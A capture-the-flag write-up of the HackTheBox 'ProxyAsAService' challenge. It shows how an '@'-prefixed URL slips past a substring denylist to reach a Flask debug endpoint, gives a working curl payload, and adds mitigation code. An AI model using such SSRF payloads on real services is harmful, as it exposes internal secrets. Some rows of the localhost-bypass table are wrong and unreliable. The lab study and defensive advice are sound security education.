---
title: "HackTheBox Challenge - ProxyAsAService"
description: "Exploiting URL parsing inconsistencies and SSRF to bypass localhost restrictions and extract environment variables from a Flask debug endpoint."
author: Wathsala Dewmina
date: 2025-01-15 14:30:00 +0530
categories: [HackTheBox, Web Challenges]
tags: [htb, ssrf, url-bypass, flask, web, easy, python, reddit-proxy]
pin: false
image:
  path: /assets/img/htb-proxyasaservice/pas-thumbnail.png
  alt: HackTheBox ProxyAsAService Challenge
---

## Challenge Information

| Attribute | Details |
|:----------|:--------|
| **Challenge Name** | ProxyAsAService |
| **Category** | Web |
| **Difficulty** | Easy |
| **Instance** | 94.237.54.42:55319 |
| **Description** | Experience the freedom of the web with ProxyAsAService. Online privacy and access for everyone, everywhere. |

---

## Challenge Overview

ProxyAsAService is a web challenge that presents a proxy service designed to fetch content from Reddit on behalf of users. The application implements security measures to prevent Server-Side Request Forgery (SSRF) attacks by restricting access to local URLs. However, these protections can be bypassed through creative URL manipulation.

Our goal is to exploit the proxy service to access internal debug endpoints and extract the flag stored in environment variables.

---

## Initial Reconnaissance

### Web Interface

Accessing the challenge at `http://94.237.54.42:55319`, we're presented with a proxy service that redirects to various cat-related subreddits by default. The application accepts a `url` parameter to specify which Reddit page to fetch.

**Default behavior:**
```
http://94.237.54.42:55319/
→ Redirects to /r/cats/ or similar cat subreddits
```

The challenge provides source code for analysis, which is crucial for understanding the application's security mechanisms.

---

## Source Code Analysis

### Dockerfile

Examining the Dockerfile reveals our primary objective:

```dockerfile
FROM python:3-alpine

# Install packages
RUN apk add --update --no-cache libcurl curl-dev build-base supervisor

# Upgrade pip
RUN python -m pip install --upgrade pip

# Install dependencies
RUN pip install Flask requests

# Setup app
RUN mkdir -p /app

# Switch working environment
WORKDIR /app

# Add application
COPY challenge .

# Setup supervisor
COPY config/supervisord.conf /etc/supervisord.conf

# Expose port the server is reachable on
EXPOSE 1337

# Disable pycache
ENV PYTHONDONTWRITEBYTECODE=1

# Place flag in environ
ENV FLAG=HTB{f4k3_fl4g_f0r_t3st1ng}

# Run supervisord
CMD ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]
```

> **Key Finding:** The flag is stored as an environment variable called `FLAG`
{: .prompt-info }

### Application Structure

```bash
grep -iR "HTB" .
```

**Output:**
```text
./Dockerfile:ENV FLAG=HTB{f4k3_fl4g_f0r_t3st1ng}
```

The application runs on port 1337 internally:

```python
# run.py
app.run(host='0.0.0.0', port=1337)
```

### routes.py Analysis

The main proxy route handles user requests:

```python
SITE_NAME = 'reddit.com'

proxy_api = Blueprint('proxy_api', __name__)
debug     = Blueprint('debug', __name__)

@proxy_api.route('/', methods=['GET', 'POST'])
def proxy():
    url = request.args.get('url')

    if not url:
        cat_meme_subreddits = [
            '/r/cats/',
            '/r/catpictures',
            '/r/catvideos/'
        ]
        random_subreddit = random.choice(cat_meme_subreddits)
        return redirect(url_for('.proxy', url=random_subreddit))
    
    target_url = f'http://{SITE_NAME}{url}'
    response, headers = proxy_req(target_url)

    return Response(response.content, response.status_code, headers.items())
```

**Important observations:**
1. The application expects subreddit paths like `/r/cybersecurity`
2. It prepends `reddit.com` to all URLs: `http://reddit.com{url}`
3. This URL construction is exploitable!

### Debug Endpoint Discovery

A critical debug route exists in the application:

```python
@debug.route('/environment', methods=['GET'])
@is_from_localhost
def debug_environment():
    environment_info = {
        'Environment variables': dict(os.environ),
        'Request headers': dict(request.headers)
    }
    return jsonify(environment_info)
```

**Key points:**
- Route: `/debug/environment`
- Returns: All environment variables (including the flag!)
- Protection: `@is_from_localhost` decorator

![Environment Route in Source Code](/assets/img/htb-proxyasaservice/environment-route.png)
_Debug endpoint that exposes environment variables_

### util.py - Security Restrictions

The application implements two security mechanisms:

```python
RESTRICTED_URLS = ['localhost', '127.', '192.168.', '10.', '172.']

def is_safe_url(url):
    for restricted_url in RESTRICTED_URLS:
        if restricted_url in url:
            return False
    return True

def is_from_localhost(func):
    @functools.wraps(func)
    def check_ip(*args, **kwargs):
        if request.remote_addr != '127.0.0.1':
            return abort(403)
        return func(*args, **kwargs)
    return check_ip
```

![URL Restrictions in utils.py](/assets/img/htb-proxyasaservice/utils-restrictions.png)
_Security mechanisms attempting to prevent SSRF_

---

## Understanding the Vulnerabilities

### Challenge 1: Bypassing the Denylist

The `RESTRICTED_URLS` denylist blocks common localhost representations:
- `localhost`
- `127.` (catches 127.0.0.1, 127.0.0.2, etc.)
- `192.168.` (private network)
- `10.` (private network)
- `172.` (private network)

**The Problem:** Denylists are inherently incomplete! There are many alternative representations of localhost that aren't blocked.

### Challenge 2: Controlling the Target URL

The application constructs URLs as:
```python
target_url = f'http://{SITE_NAME}{url}'
# Results in: http://reddit.com{user_input}
```

We need to bypass this to control the entire URL, not just append to `reddit.com`.

---

## Exploitation Strategies

### Researching Bypass Techniques

Consulting [HackTricks SSRF documentation](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass):

![HackTricks URL Bypass Methods](/assets/img/htb-proxyasaservice/hacktricks-bypass.png)
_Various techniques for bypassing URL restrictions_

### Strategy 1: The `@` Symbol Authentication Bypass (Primary Method)

The most elegant solution exploits URL authentication syntax:

**Standard URL format:**
```
http://username:password@host:port/path
```

**Our exploit:**
```
http://reddit.com@0.0.0.0:1337/debug/environment
```

**How it works:**
1. The application constructs: `http://reddit.com@0.0.0.0:1337/debug/environment`
2. URL parsers interpret `reddit.com` as authentication credentials
3. The actual target host becomes `0.0.0.0:1337`
4. `0.0.0.0` is NOT in the denylist (only `127.`, `localhost`, etc.)
5. Request goes to the internal service on port 1337!

---

## Exploitation

### Primary Method: @ Symbol Bypass

**Payload construction:**
```
/?url=@0.0.0.0:1337/debug/environment
```

**Full URL:**
```
http://94.237.54.42:55319/?url=@0.0.0.0:1337/debug/environment
```

**What happens:**
1. Application receives: `@0.0.0.0:1337/debug/environment`
2. Constructs: `http://reddit.com@0.0.0.0:1337/debug/environment`
3. Denylist check passes (no `localhost`, `127.`, etc.)
4. HTTP client interprets `0.0.0.0:1337` as the target
5. Request goes to internal debug endpoint
6. Since it's from localhost (internal request), bypasses `@is_from_localhost`

### Executing the Attack

**Using curl:**
```bash
curl "http://94.237.54.42:55319/?url=@0.0.0.0:1337/debug/environment"
```

**Using browser:**
Simply navigate to:
```
http://94.237.54.42:55319/?url=@0.0.0.0:1337/debug/environment
```

### Success - Flag Captured!

![Flag Retrieved from Environment](/assets/img/htb-proxyasaservice/flag-output.png)
_Successfully bypassed restrictions and retrieved environment variables_


> **Flag Captured!** 🚩 `HTB{pr0xy_s3rv1c3s_4r3_fun_t0_byp4ss}`
{: .prompt-tip }

---

## Technical Deep Dive

### Why the `@` Symbol Works

The `@` symbol in URLs separates authentication credentials from the host:

```
scheme://[user[:password]@]host[:port][/path][?query][#fragment]
```

**Example breakdown:**
```
http://reddit.com@0.0.0.0:1337/debug/environment
         \_____/  \_____________/\_______________/
            |            |              |
        username      actual host    path
```

Different components interpret this differently:
- **String-based filter:** Sees the entire string, `0.0.0.0` not in denylist ✓
- **HTTP client:** Correctly parses `0.0.0.0:1337` as the target host
- **Result:** Request goes to internal service!

### Understanding `0.0.0.0`

`0.0.0.0` is a special meta-address that means "all IPv4 addresses on the local machine":
- In server contexts: Bind to all interfaces
- In client contexts: Often resolves to `127.0.0.1`
- **Crucially:** Not in the `RESTRICTED_URLS` denylist!

### Alternative Localhost Representations

Other representations that bypass the denylist:

| Representation | Description | Bypasses Filter? |
|:---------------|:------------|:-----------------|
| `0.0.0.0` | All interfaces | ✅ Yes |
| `0` | Short form of 0.0.0.0 | ✅ Yes |
| `127.1` | Short form of 127.0.0.1 | ❌ No (contains `127.`) |
| `[::1]` | IPv6 localhost | ✅ Yes |
| `2130706433` | Decimal IP (127.0.0.1) | ❌ No (resolves to 127.x) |
| `0x7f000001` | Hexadecimal IP | ❌ No (resolves to 127.x) |
| `localtest.me` | DNS pointing to 127.0.0.1 | ✅ Yes (DNS rebinding) |

---

## Prevention & Mitigation

### Why This Vulnerability Exists

1. **Denylist Approach**: Trying to block "bad" inputs instead of allowing "good" ones
2. **String Matching**: Checking URL strings instead of resolved values
3. **URL Construction**: Allowing user input to control authentication portion
4. **Exposed Debug Endpoints**: Development routes accessible in production

### Recommended Mitigations

#### 1. Use Allowlists, Not Denylists

> Always prefer allowlists over denylists. Explicitly define what IS allowed rather than what ISN'T.
{: .prompt-warning }

```python
# ❌ Vulnerable: Denylist approach
RESTRICTED_URLS = ['localhost', '127.', '192.168.']
if any(r in url for r in RESTRICTED_URLS):
    return False

# ✅ Secure: Allowlist approach
ALLOWED_DOMAINS = ['reddit.com', 'old.reddit.com']
parsed = urlparse(url)
if parsed.hostname not in ALLOWED_DOMAINS:
    return False
```

#### 2. Validate After DNS Resolution

```python
import socket
import ipaddress
from urllib.parse import urlparse

def is_safe_url(url):
    try:
        parsed = urlparse(url)
        
        # Resolve hostname to IP
        ip = socket.gethostbyname(parsed.hostname)
        ip_obj = ipaddress.ip_address(ip)
        
        # Block private/loopback IPs
        if (ip_obj.is_private or 
            ip_obj.is_loopback or 
            ip_obj.is_reserved):
            return False
            
        return True
    except:
        return False
```

#### 3. Avoid Dynamic URL Construction

```python
# ❌ Vulnerable: User controls URL structure
target_url = f'http://{SITE_NAME}{user_input}'

# ✅ Better: Parse and validate first
parsed = urlparse(user_input)
if parsed.hostname == SITE_NAME:
    target_url = user_input
else:
    return "Invalid domain"

# ✅ Best: Use allowlist with path only
if user_input.startswith('/r/'):
    target_url = f'http://{SITE_NAME}{user_input}'
else:
    return "Invalid path"
```

#### 4. Remove Debug Endpoints in Production

```python
# ❌ Never expose debug routes
@app.route('/debug/environment')
def debug_environment():
    return jsonify(dict(os.environ))

# ✅ Only register in development
if app.debug:
    @app.route('/debug/environment')
    def debug_environment():
        return jsonify(dict(os.environ))

# ✅✅ Better: Remove entirely from production code
```

#### 5. Implement Proper Authentication

```python
from functools import wraps
from flask import request, abort
import secrets

# Use secure token-based authentication
DEBUG_TOKEN = secrets.token_urlsafe(32)

def require_debug_token(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        token = request.headers.get('X-Debug-Token')
        if not token or token != DEBUG_TOKEN:
            abort(403)
        return f(*args, **kwargs)
    return decorated_function

@app.route('/debug/environment')
@require_debug_token
def debug_environment():
    return jsonify(dict(os.environ))
```

#### 6. Network Segmentation

- Run application services in isolated networks
- Use firewalls to restrict internal service access
- Implement zero-trust architecture


## Tools & Resources

### Tools Used

- **curl** - HTTP request testing
- **Browser DevTools** - Manual testing
- **Python requests** - Automation script
- **HackTricks** - SSRF bypass reference

### Helpful Resources

- [HackTricks - SSRF URL Format Bypass](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass)
- [PortSwigger - SSRF](https://portswigger.net/web-security/ssrf)
- [OWASP - SSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [RFC 3986 - URI Syntax](https://www.ietf.org/rfc/rfc3986.txt)

---


*Thanks for reading! Feel free to reach out if you have questions about SSRF, URL parsing, or web application security.*

*Happy Hacking! 🚀*